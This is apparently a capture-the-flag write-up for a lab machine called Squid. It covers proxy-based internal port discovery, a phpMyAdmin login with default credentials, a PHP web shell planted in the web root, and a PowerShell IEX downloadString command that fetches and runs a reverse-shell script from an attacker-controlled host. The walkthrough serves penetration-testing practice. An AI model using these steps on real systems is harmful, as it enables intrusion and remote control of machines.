First thing first we start with scanning the host for open ports using rustscan then use nmap to further enumerate those ports open

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/pg/images/Squid/1.png)

```
# Nmap 7.92 scan initiated Fri Jan 13 14:46:40 2023 as: nmap -sCV -A -p3128 -oN nmapscan -Pn 192.168.68.189
Nmap scan report for 192.168.68.189
Host is up (0.22s latency).

PORT     STATE SERVICE    VERSION
3128/tcp open  http-proxy Squid http proxy 4.14
|_http-server-header: squid/4.14
|_http-title: ERROR: The requested URL could not be retrieved

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan 13 14:47:16 2023 -- 1 IP address (1 host up) scanned in 36.55 seconds
```

From the scan result we see that its a linux box and has only one port open which is port 3128 and the service that runs on it is squid proxy.

Now what is `Squid Proxy`: Squid is a full-featured web proxy cache server application which provides proxy and cache services for Hyper Text Transport Protocol (HTTP), File Transfer Protocol (FTP), and other popular network protocols. 

Basically its just a web proxy cache server application. And its the link between the external service and internal service

If we try accessing it we will get some sort of error
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/pg/images/Squid/2.png)

So we can leverage squid by scanning the internal ports open in the target

Firstly I need to generate a wordlist which will contain 1-65535 (tcp ports)
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/pg/images/Squid/3.png)

Then FUZZ for the internal ports and the squid proxy will be the proxy which will allow me perform this action
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/pg/images/Squid/4.png)

From the result we see that there are 2 internal running ports which are `3306` & `8080`

Using foxy proxy we can access the internal web page using the squid ip and port
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/pg/images/Squid/6.png)

Now lets access it by naviagating to http://127.0.0.1:8080/ we are presented with a default page for wampserver 

Looking below we see a phpmyadmin link lets click on it

Then logging in with the default cred `root:<blank_password>` we get access to the phpmyadmin panel
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/pg/images/Squid/8.png)

We can leverage this to get remote code execution as far as the user has write access over the web root directory which in this case its `C:\wampp\www` 

Then creating a php code that would give us code execution and saving it in the web root directory
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/pg/images/Squid/9.png)

Now to get code execution we just need to call in the the file and use ?cmd=<command> to run the command

And the web server is running as root 
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/pg/images/Squid/10.png)

Lets get a more stable shell

I'll be using Invoke-PowerShellTcp.ps1 script
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/pg/images/Squid/11.png)

So I set up a python http server on port 80 and a netcat listener on port 4444

Then to get shell i'll use this powershell command which would load the external script and execute it in this case the powershell reverse shell script

```
powershell IEX(New-Object Net.WebClient).downloadString('http://<ip>:<port>/Invoke-PowerShellTcp.ps1')
```
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/pg/images/Squid/12.png)

Now back on our python http server
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/pg/images/Squid/13.png)

Now on our netcat listener we get a shell
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/pg/images/Squid/14.png)

Incase you have any problem on this or I made a mistake please be sure to DM me on discord `Hack.You#9120`

<br> <br>
[Back To Home](../../index.md)
<br>


